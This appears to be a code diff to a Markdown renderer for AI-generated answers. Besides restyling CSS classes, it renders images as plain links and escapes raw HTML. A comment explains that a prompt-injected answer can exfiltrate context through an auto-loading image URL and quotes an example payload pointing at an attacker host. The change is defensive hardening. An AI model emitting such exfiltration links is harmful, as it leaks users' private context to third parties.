@@ -85,7 +85,7 @@ export default {
   },
 
   checkbox({ checked }) {
-    return `<input ${checked ? "checked" : ""} type="checkbox" class="mr-2 align-middle pointer-events-none accent-light-primary dark:accent-dark-primary" />`;
+    return `<input ${checked ? "checked" : ""} type="checkbox" class="mr-2 align-middle pointer-events-none accent-primary" />`;
   },
 
   paragraph({ tokens }) {
@@ -98,7 +98,7 @@ export default {
     const rowsHtml = rows
       .map((row) => {
         const cells = row.map((cell) => this.tablecell(cell)).join("");
-        return `<tr class="[&:not(:has(th)):not(:last-of-type)]:border-b [&:not(:has(th)):not(:last-of-type)]:border-b-light-border [&:not(:has(th)):not(:last-of-type)]:dark:border-b-dark-border">${cells}</tr>`;
+        return `<tr class="[&:not(:has(th)):not(:last-of-type)]:border-b [&:not(:has(th)):not(:last-of-type)]:border-b-border">${cells}</tr>`;
       })
       .join("");
 
@@ -139,7 +139,7 @@ export default {
 
   codespan({ text }) {
     const escapedText = escapeHtml(text);
-    return `<code class="whitespace-pre-wrap p-1 rounded bg-gray-100 dark:bg-dark-bg-contrast text-light-text-primary dark:text-dark-text-primary text-sm">${escapedText}</code>`;
+    return `<code class="whitespace-pre-wrap p-1 rounded bg-muted text-foreground text-sm">${escapedText}</code>`;
   },
 
   br() {
@@ -156,14 +156,25 @@ export default {
     const escapedTitle = title ? escapeHtml(title) : "";
     const titleAttr = escapedTitle ? ` title="${escapedTitle}"` : "";
     const text = this.parser.parseInline(tokens);
-    return `<a href="${sanitizedHref}"${titleAttr} target="_blank" rel="noopener noreferrer" class="underline underline-offset-4 text-light-text-accent dark:text-dark-text-accent">${text}</a>`;
+    return `<a href="${sanitizedHref}"${titleAttr} target="_blank" rel="noopener noreferrer" class="underline underline-offset-4 text-foreground">${text}</a>`;
   },
 
+  // Rendered as a link, never an <img>: an auto-loading image lets a prompt-injected answer
+  // exfiltrate context via its URL (`![](https://attacker/?q=secret)`) with no user click.
   image({ href, title, text }) {
-    const sanitizedSrc = sanitizeHref(href) ?? "#";
-    const escapedAlt = escapeHtml(text);
+    const sanitizedHref = sanitizeHref(href) ?? "#";
+    const escapedText = escapeHtml(text || href);
     const escapedTitle = title ? escapeHtml(title) : "";
     const titleAttr = escapedTitle ? ` title="${escapedTitle}"` : "";
-    return `<img src="${sanitizedSrc}" alt="${escapedAlt}"${titleAttr} class="h-64 rounded" />`;
+    return `<a href="${sanitizedHref}"${titleAttr} target="_blank" rel="noopener noreferrer" class="underline underline-offset-4 text-foreground">${escapedText}</a>`;
+  },
+
+  // Raw HTML from the model is shown as text, so the only real tags in the output are the ones
+  // this renderer emits. DOMPurify in parseMarkdown remains the second, independent layer.
+  html({ text, block }) {
+    const escapedText = escapeHtml(text);
+    return block
+      ? `<p class="whitespace-pre-wrap break-words text-base [&:not(:last-child)]:mb-2">${escapedText}</p>`
+      : escapedText;
   },
 } as RendererObject;
